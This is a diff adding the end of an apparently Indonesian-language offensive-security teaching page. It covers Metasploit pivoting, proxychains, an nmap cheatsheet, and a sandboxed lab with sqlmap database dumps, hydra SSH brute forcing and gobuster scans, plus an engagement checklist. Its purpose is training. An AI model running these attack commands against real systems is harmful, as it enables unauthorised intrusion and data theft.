+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">metasploit :: route pivot</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre>meterpreter &gt; run autoroute -s 172.16.5.0/24
+meterpreter &gt; background
+msf6 &gt; use auxiliary/scanner/portscan/tcp
+msf6 &gt; set rhosts 172.16.5.10
+msf6 &gt; set session 1   <span class="t-comment"># lewat sesi sebagai jembatan</span></pre></div>
+            </div>
+            <div class="terminal">
+              <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">proxychains :: socks tunnel</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+              <div class="term-body"><pre><span class="t-cmd">$</span> proxychains nmap -sT -Pn 172.16.5.10
+<span class="t-comment"># semua tools jalan lewat proxy SOCKS</span>
+<span class="t-cmd">$</span> proxychains hydra -l admin -P pass.txt ssh://172.16.5.10</pre></div>
+            </div>
+          </div>
+          <div class="quote">Pivoting menguji kedewasaanmu: terus berapa jauh kamu bergerak dalam scope yang disepakati. Pergerakan di luar scope adalah pelanggaran kontrak serius.</div>
+        </section>
+
+        <!-- CHEATSHEET -->
+        <section class="section" id="cheatsheet">
+          <div class="sec-head">
+            <span class="sec-num">10 — referensi cepat</span>
+            <h2 class="sec-title">Cheatsheet <span class="accent">Nmap &amp; Dasar</span></h2>
+            <p class="sec-sub">Tabel perintah yang paling sering dipakai di engagement nyata — simpan sebagai referensi.</p>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>Perintah</th><th>Fungsi</th></tr></thead>
+              <tbody>
+                <tr><td class="mono">nmap -sS 10.0.0.0/24</td><td>SYN scan cepat (default)</td></tr>
+                <tr><td class="mono">nmap -sV -sC -p- --open host</td><td>Full port + service version + default scripts</td></tr>
+                <tr><td class="mono">nmap --script vulners -sV host</td><td>Deteksi kerentanan via database versi</td></tr>
+                <tr><td class="mono">ffuf -w wordlist -u URL/FUZZ -mc 200,301,302</td><td>Content discovery</td></tr>
+                <tr><td class="mono">curl -v http://host/resource</td><td>Inspeksi HTTP header/body</td></tr>
+                <tr><td class="mono">nmap --script smb-enum-shares -p445 host</td><td>Enumerasi share SMB</td></tr>
+                <tr><td class="mono">whois domain | dig any domain</td><td>Dasar informasi domain</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <!-- CHECKLIST -->
+        <!-- ============ PRAKTIKUM ============ -->
+        <section class="section" id="praktik">
+          <div class="sec-head">
+            <span class="sec-num">sesi praktikum</span>
+            <h2 class="sec-title">Praktik Langsung: <span class="accent">Menelusuri Kill Chain di Terminal</span></h2>
+            <p class="sec-sub">Empat fase inti penetrasi kini kamu eksekusi sendiri: reconnaissance, scanning, vulnerability assessment, dan pengumpulan bukti. Klik <b>Jalankan</b> di tiap langkah — semua aktivitas legal karena berjalan di lab sandbox terisolasi.</p>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>1. Reconnaissance: Kenali Host Sebelum Menyerang</h3>
+              <p>Fase pertama kill chain dimulai dari buku alamat. <code class="inline">cat</code> pada daftar target dan <code class="inline">ping</code> untuk memastikan host hidup. Perhatikan: <code class="inline">kali-recon</code> (192.168.1.30) menolak ping — tanda bahwa jangan mengganggu host lain di lab.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="cd /home/student/lab && cat targets.txt && ping 192.168.1.10"><svg><use href="#ic-terminal"/></svg>Recon Target</button>
+                <code class="run-hint">cd /home/student/lab && cat targets.txt && ping 192.168.1.10</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>2. Scanning dan Enumeration: Peta Layanan</h3>
+              <p>Setelah target hidup, petakan layanannya. <code class="inline">nmap -sV</code> mengungkap versi layanan di port terbuka; bocoran versi adalah pintu masuk ke exploit yang cocok. Scan ke host Windows memperlihatkan port SMB (445) dan RDP (3389) — sasaran umum lateral movement.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="nmap -sV 192.168.1.10"><svg><use href="#ic-terminal"/></svg>Scan Web Server</button>
+                <code class="run-hint">nmap -sV 192.168.1.10</code>
+                <button class="run-btn" type="button" data-run="nmap -p 135,139,445,3389,5985 192.168.1.20"><svg><use href="#ic-terminal"/></svg>Scan AD Server</button>
+                <code class="run-hint">nmap -p 135,139,445,3389,5985 192.168.1.20</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>3. Vulnerability Assessment: Bukti Injeksi SQL</h3>
+              <p>Pemindaian versi memperlihatkan aplikasi web. Langkah berikutnya menguji parameter untuk SQL injection dengan SQLMap: mendata database (<code class="inline">--dbs</code>), lalu mengekstrak data (<code class="inline">--dump</code>) sebagai bukti terdokumentasi — mirip seri walkthrough SQLi di atas.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="sqlmap -u 'http://lab-web-01/search?id=1' --dbs --batch"><svg><use href="#ic-terminal"/></svg>SQLMap --dbs</button>
+                <code class="run-hint">sqlmap -u 'http://lab-web-01/search?id=1' --dbs --batch</code>
+                <button class="run-btn" type="button" data-run="sqlmap -u 'http://lab-web-01/search?id=1' --dump"><svg><use href="#ic-terminal"/></svg>SQLMap --dump</button>
+                <code class="run-hint">sqlmap -u 'http://lab-web-01/search?id=1' --dump</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>4. Pengumpulan Bukti yang Dapat Dipertanggungjawabkan</h3>
+              <p>Pentester profesional merekam setiap langkah dan menjaga integritas bukti. Hash memastikan berkas bukti tidak berubah sejak diambil: <code class="inline">sha256sum</code> menjadi sidik jari bukti, dan catatan scan di <code class="inline">scan1.txt</code> menjadi lampiran laporan.</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="cd /home/student/lab && cat scan1.txt && sha256sum scan1.txt"><svg><use href="#ic-terminal"/></svg>Bukti dan Hash</button>
+                <code class="run-hint">cd /home/student/lab && cat scan1.txt && sha256sum scan1.txt</code>
+              </div>
+            </div>
+          </div>
+
+          <div class="praktik">
+            <div class="praktik-explain">
+              <h3>5. Serangan Kredensial &amp; Klaim Flag</h3>
+              <p>Kredensial adalah sasaran paling sering dalam pentest realistis. <code class="inline">hydra</code> menguji kombinasi user + kata sandi terhadap SSH lab-web-01 dengan wordlist internal; <code class="inline">gobuster</code> memetakan direktori layanan web untuk menemukan path tersembunyi. Setelah bukti di tangan, klaim flag legal: <code class="inline">flag FLAG{lab-web-01}</code> — penanda kamu menyelesaikan misi dengan sah dan terdokumentasi (lampiran ROA).</p>
+            </div>
+            <div class="praktik-play">
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="hydra -l webadmin -P /opt/lab/wordlists/passwords.txt ssh://lab-web-01"><svg><use href="#ic-terminal"/></svg>Hydra SSH</button>
+                <code class="run-hint">hydra -l webadmin -P /opt/lab/wordlists/passwords.txt ssh://lab-web-01</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="gobuster dir -u http://lab-web-01 -w /opt/lab/wordlists/directory.txt"><svg><use href="#ic-terminal"/></svg>Gobuster Dir</button>
+                <code class="run-hint">gobuster dir -u http://lab-web-01 -w /opt/lab/wordlists/directory.txt</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="cat lab/flag-web.txt"><svg><use href="#ic-terminal"/></svg>Baca Flag</button>
+                <code class="run-hint">cat lab/flag-web.txt</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="flag FLAG{lab-web-01}"><svg><use href="#ic-terminal"/></svg>Klaim Flag</button>
+                <code class="run-hint">flag FLAG{lab-web-01}</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="score"><svg><use href="#ic-terminal"/></svg>Lihat Skor</button>
+                <code class="run-hint">score</code>
+              </div>
+              <div class="run-line">
+                <button class="run-btn" type="button" data-run="missions"><svg><use href="#ic-terminal"/></svg>Misi Terbuka</button>
+                <code class="run-hint">missions</code>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="section" id="checklist">
+          <div class="sec-head">
+            <span class="sec-num">11 — prosedur</span>
+            <h2 class="sec-title">Checklist Offensive <span class="accent">Workflow</span></h2>
+          </div>
+          <div class="grid-3">
+            <div class="card reveal">
+              <h3><span class="tag tag-off">Pre-Engagement</span></h3>
+              <ol style="color:var(--dim);margin-left:18px;font-size:0.92rem;">
+                <li>Scope &amp; izin tertulis ditandatangani</li>
+                <li>Ruang lingkup target eksplisit (IP/domain)</li>
+                <li>Aturan engagement: jam uji, tools terlarang</li>
+                <li>Kontak darurat (incident) tersedia</li>
+                <li>Backup / snapshot target disiapkan</li>
+              </ol>
+            </div>
+            <div class="card reveal">
+              <h3><span class="tag tag-rec">During</span></h3>
+              <ol style="color:var(--dim);margin-left:18px;font-size:0.92rem;">
+                <li>Recon pasif sebelum aktif</li>
+                <li>Enumeration menyeluruh (semua service)</li>
+                <li>Uji manual + verifikasi false positive</li>
+                <li>Exploitation terukur &amp; terdokumentasi</li>
+                <li>Post-exploit seminimal mungkin untuk bukti dampak</li>
+              </ol>
+            </div>
+            <div class="card reveal">
+              <h3><span class="tag tag-def">Post</span></h3>
+              <ol style="color:var(--dim);margin-left:18px;font-size:0.92rem;">
+                <li>Bersihkan implant &amp; artifact</li>
+                <li>Tulis laporan: temuan + bukti (screenshot)</li>
+                <li>Severity dengan CVSS &amp; EPSS</li>
+                <li>Rekomendasi remediasi yang testable</li>
+                <li>De-brief dengan tim IT &amp; jadwalkan retest</li>
+              </ol>
+            </div>
+          </div>
+        </section>
+
+        <section class="section">
+          <div class="cta-row">
+            <a class="cta cta-def reveal" href="methodology.html">
+              <span class="cta-lab">selanjutnya</span>
+              <h3>Detail Metodologi Pentest</h3>
+              <p>Kerangka kerja standar, template laporan, dan scoring severity yang profesional.</p>
+            </a>
+            <a class="cta reveal" href="defensive.html">
+              <span class="cta-lab">selanjutnya</span>
+              <h3>Beralih ke Cara Defend</h3>
+              <p>Pahami sisi pembela: bagaimana deteksi dan respons bekerja melawan teknik yang kamu pelajari.</p>
+            </a>
+          </div>
+        </section>
+
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-inner">
+      <div>
+        <a href="index.html" class="brand" style="margin-bottom:14px;display:inline-block;">
+          <span class="brand-mark"><svg><use href="#ic-shield"/></svg></span>
+          <span class="brand-name">CYBER<span class="c">GUARD</span></span>
+        </a>
+        <p style="font-size:0.9rem;max-width:340px;">Platform edukasi keamanan siber untuk membangun generasi profesional keamanan digital Indonesia.</p>
+      </div>
+      <div>
+        <h4>Materi Utama</h4>
+        <ul>
+          <li><a href="fundamentals.html">Fundamental</a></li>
+          <li><a href="tools.html">Tools Keamanan</a></li>
+          <li><a href="offensive.html">Offensive Security</a></li>
+          <li><a href="defensive.html">Defensive Security</a></li>
+          <li><a href="methodology.html">Metodologi Pentest</a></li>
+          <li><a href="careers.html">Jalur Karir</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>Navigasi</h4>
+        <ul>
+          <li><a href="index.html">Beranda</a></li>
+          <li><a href="#killchain">Kill Chain</a></li>
+          <li><a href="#sqli">Walkthrough SQLi</a></li>
+          <li><a href="#ad">Active Directory</a></li>
+          <li><a href="#checklist">Checklist</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-note">CyberGuard Academy &copy; 2026 — Gunakan pengetahuan secara bertanggung jawab.</div>
+  </footer>
+
+  <div class="toast"><svg><use href="#ic-check"/></svg><span>Konten disalin</span></div>
+  <button class="back-top" aria-label="Kembali ke atas"><svg><use href="#ic-up"/></svg></button>
+
+  <!-- ============ GLOBAL TERMINAL (real-time sandbox) ============ -->
+  <div class="term-shell" id="termShell" aria-hidden="true">
+    <div class="term-shell-bar">
+      <span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span>
+      <span class="term-shell-title">sandbox-lab &mdash; terminal real-time</span>
+      <span class="term-shell-status">LIVE &mdash; SANDBOX</span>
+      <button class="term-shell-btn" type="button" data-term-clear>Bersihkan</button>
+      <button class="term-shell-btn" type="button" data-term-copy>Salin</button>
+      <button class="term-shell-btn" type="button" data-term-close>Tutup</button>
+    </div>
+    <div class="term-shell-body" id="termShellBody"></div>
+    <div class="term-shell-input">
+      <span class="ts-prompt" id="termPrompt">student@cyberguard:~$</span>
+      <input type="text" id="termInput" autocomplete="off" spellcheck="false" aria-label="Ketik perintah terminal">
+    </div>
+  </div>
+
+  <script src="js/script.js"></script>
+  <script src="js/terminal.js"></script>
+</body>
+</html>
